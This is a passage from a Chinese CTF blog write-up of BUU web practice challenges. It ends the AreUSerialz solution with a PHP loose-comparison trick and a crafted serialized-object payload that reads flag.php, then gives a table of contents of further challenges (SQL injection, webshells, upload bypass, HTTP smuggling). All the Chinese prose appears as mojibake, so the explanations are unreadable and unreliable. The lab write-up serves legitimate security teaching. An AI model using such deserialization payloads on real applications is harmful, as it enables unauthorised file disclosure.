<p>è€Œç¬¬äºŒæ¬¡åœ¨<code>process</code>å‡½æ•°ä¸­ç”¨çš„æ˜¯å¼±æ¯”è¾ƒ<code>==</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå°±å¯ä»¥ä½¿å¾—<code>op</code>ä¸º<code>int</code>å‹çš„<code>2</code>ï¼Œè¿™æ ·å³å¯å¦‚ä¸‹ç»“æœ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;op === &quot;2&quot;) 		ä¸ºFalse</span><br><span class="line">if($this-&gt;op == &quot;1&quot;)		ä¸ºFalse</span><br><span class="line">else if($this-&gt;op == &quot;2&quot;)	ä¸ºTrue</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå³å¯é¡ºåˆ©è·³åˆ°æ‰“å°<code>filename</code>çš„åœ°æ–¹</p>
<p>æ¡ä»¶ä¸‰å°±ä¸ç”¨è¯´äº†ï¼Œå¯¹åº”èµ‹å€¼å³å¯ï¼Œæœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>flag</code>åœ¨æ³¨é‡Šé‡Œã€‚</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/">http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98/">é™ªXXçš„WebBUUåˆ·é¢˜</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">PHPç¯å¢ƒæ­å»º</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/12/29/Web%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="paginator-prev__text">[ Untitled ]</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81EasySQL"><span class="toc-text">
          ä¸€ã€EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BASQL%E6%B3%A8%E5%85%A5%E7%99%BB%E5%BD%95"><span class="toc-text">
          ğŸ”ºSQLæ³¨å…¥ç™»å½•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">
          1.æŸ¥çœ‹ç½‘é¡µæºä»£ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">
          2.æ³¨å…¥åŸç†</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81"><span class="toc-text">
          äºŒã€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun1"><span class="toc-text">
          ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E7%AE%80%E5%8D%95%E6%9F%A5%E8%AF%A2"><span class="toc-text">
          ğŸ”ºç®€å•æŸ¥è¯¢</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">
          å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
          ğŸ”ºPHPä¼ªåè®®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E6%8E%A2%E7%B4%A2"><span class="toc-text">
          1.å‰ç½®æ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-text">
          2.phpä¼ªåè®®åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-base64%E8%A7%A3%E7%A0%81"><span class="toc-text">
          3.base64è§£ç </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81"><span class="toc-text">
          äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BASQL%E6%B3%A8%E5%85%A5-%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-text">
          ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90words%E8%A1%A8"><span class="toc-text">
          è§£æwordsè¡¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%901919810931114514%E8%A1%A8"><span class="toc-text">
          è§£æ1919810931114514è¡¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%A7%A3%E6%B3%95%E4%B8%80-%E6%94%B9%E8%A1%A8"><span class="toc-text">
          1.è§£æ³•ä¸€(æ”¹è¡¨)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%B9%E5%90%8D"><span class="toc-text">
          (1)æ”¹å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A2%9E%E6%B7%BBid%E5%AD%97%E6%AE%B5"><span class="toc-text">
          (2)å¢æ·»idå­—æ®µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9flag%E4%B8%BAdata%E5%AD%97%E6%AE%B5"><span class="toc-text">
          (3)ä¿®æ”¹flagä¸ºdataå­—æ®µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%9A%84payload"><span class="toc-text">
          æ€»çš„payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E6%B3%95%E4%BA%8C-open%E5%92%8Chandler"><span class="toc-text">
          2.è§£æ³•äºŒ(openå’Œhandler)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E6%B3%95%E4%B8%89-MySQL%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">
          3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81-SUCTF-2019-EasySQL"><span class="toc-text">
          å…­ã€[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">
          ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%AF%BB%E6%89%BEflag"><span class="toc-text">
          ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">
          1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%90%9C%E7%B4%A2flag%E8%B7%AF%E5%BE%84"><span class="toc-text">
          2.æœç´¢flagè·¯å¾„</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">
          å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%8A%93%E5%8C%85-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
          ğŸ”ºæŠ“åŒ…+ä¼ªåè®®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2"><span class="toc-text">
          1.å‰æœŸæ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8A%93%E5%8C%85"><span class="toc-text">
          2.æŠ“åŒ…</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">
          ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81-GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">
          åã€[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">
          ğŸ”ºå‘½ä»¤æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-1"><span class="toc-text">
          1.å‰æœŸæ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-text">
          2.ç»•è¿‡è¿‡æ»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8B%BC%E6%8E%A5flag"><span class="toc-text">
          è§£æ³•ä¸€ï¼šæ‹¼æ¥flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Ash%E7%BB%93%E5%90%88base64"><span class="toc-text">
          è§£æ³•äºŒï¼šshç»“åˆbase64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2linux%E8%87%AA%E5%B8%A6base64%E5%92%8Cbase32"><span class="toc-text">
          â–²linuxè‡ªå¸¦base64å’Œbase32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-base64%E5%8A%A0%E5%AF%86"><span class="toc-text">
          (1)base64åŠ å¯†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-base64%E8%A7%A3%E5%AF%86"><span class="toc-text">
          (2)base64è§£å¯†</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9Alinux%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-text">
          è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%96%B2%E5%85%B6%E4%BB%96"><span class="toc-text">
          â–²å…¶ä»–</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">
          åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">
          ğŸ”ºä¸€å¥è¯æœ¨é©¬</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">
          åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E4%BD%BF%E7%94%A8BurpSuit%E6%94%B9%E5%8C%85%E5%A4%B4"><span class="toc-text">
          ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-2"><span class="toc-text">
          1.å‰æœŸæ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-BurpSuite%E4%BD%BF%E7%94%A8%E6%94%B9%E5%8C%85"><span class="toc-text">
          2.BurpSuiteä½¿ç”¨æ”¹åŒ…</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9Referer"><span class="toc-text">
          (1)ä¿®æ”¹Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9User-Agent"><span class="toc-text">
          (2)ä¿®æ”¹User-Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9X-Forwarded-For"><span class="toc-text">
          (3)ä¿®æ”¹X-Forwarded-For</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">
          åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">
          ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-3"><span class="toc-text">
          1.å‰æœŸæ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-1"><span class="toc-text">
          2.ç»•è¿‡è¿‡æ»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9Content-Type"><span class="toc-text">
          (1)ä¿®æ”¹Content-Type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">
          (2)ä¿®æ”¹åç¼€å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9php%E6%A0%BC%E5%BC%8F"><span class="toc-text">
          (3)ä¿®æ”¹phpæ ¼å¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8"><span class="toc-text">
          (4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9F%A5%E6%89%BE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-text">
          3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">
          åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-RoarCTF-2019-Easy-Calc"><span class="toc-text">
          åäº”ã€[RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E3%80%81HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"><span class="toc-text">
          ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-4"><span class="toc-text">
          1.å‰æœŸæ¢ç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-text">
          2.è§£å†³æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF"><span class="toc-text">
          è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BB%95%E8%BF%87WAF"><span class="toc-text">
          (1)ç»•è¿‡WAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-2"><span class="toc-text">
          (2)ç»•è¿‡è¿‡æ»¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"><span class="toc-text">
          è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8CL-CL"><span class="toc-text">
          (1)åˆ©ç”¨CL-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8CL-TE"><span class="toc-text">
          (2)åˆ©ç”¨CL-TE</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">
          åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">
          ğŸ”ºPHPååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%86%E6%9E%90"><span class="toc-text">
          1.åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87-wakeup"><span class="toc-text">
          2.ç»•è¿‡__wakeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-text">
          å°æŠ€å·§</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-private%E6%88%90%E5%91%98"><span class="toc-text">
          3.privateæˆå‘˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88payload"><span class="toc-text">
          4.æœ€ç»ˆpayload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%83%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-text">
          åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E3%80%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-text">
          ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-HCTF-2018-admin"><span class="toc-text">
          åå…«ã€[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E7%88%86%E7%A0%B4%E3%80%81%E6%A8%A1%E6%9D%BF%E5%BA%93%E5%87%BD%E6%95%B0%E3%80%81"><span class="toc-text">
          ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-text">
          1.è§£æ³•ä¸€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-text">
          2.è§£æ³•äºŒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E6%B3%95%E4%B8%89"><span class="toc-text">
          3.è§£æ³•ä¸‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-BJDCTF2020-Easy-MD5"><span class="toc-text">
          åä¹ã€[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAMD5-SQL%E3%80%81PHP%E5%BC%B1%E6%AF%94%E8%BE%83%E3%80%81%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">
          ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-MD5%E5%AE%9E%E7%8E%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">
          1.MD5å®ç°SQLæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PHP%E7%BB%93%E5%90%88MD5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">
          2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">
          3.æ•°ç»„ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">
          äºŒåã€[ZJCTF 2019]NiZhuanSiWei</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">
          ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E3%80%81-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">
          äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA-htaccess%E5%88%A9%E7%94%A8"><span class="toc-text">
          ğŸ”º.htaccessåˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%8C%E3%80%81-SUCTF-2019-CheckIn"><span class="toc-text">
          äºŒåäºŒã€[SUCTF 2019]CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA-user-ini%E5%88%A9%E7%94%A8"><span class="toc-text">
          ğŸ”º.user.iniåˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%89%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">
          äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-text">
          ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E4%B8%80"><span class="toc-text">
          æ¡ä»¶ä¸€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E4%BA%8C"><span class="toc-text">
